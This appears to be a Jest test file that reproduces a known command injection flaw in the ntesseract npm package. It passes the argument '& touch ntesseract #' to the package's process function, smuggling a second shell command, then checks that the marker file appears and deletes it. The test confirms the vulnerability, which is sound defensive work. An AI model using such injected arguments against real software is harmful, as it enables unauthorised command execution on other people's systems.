//https://snyk.io/vuln/SNYK-JS-NTESSERACT-1050982
test("Command Injection in ntesseract", () => 
{
    const a =require("ntesseract");
	const fs = require('fs')
	const path = './ntesseract'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    a.process("& touch ntesseract #",'/path/to/image.jpg',function(){});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
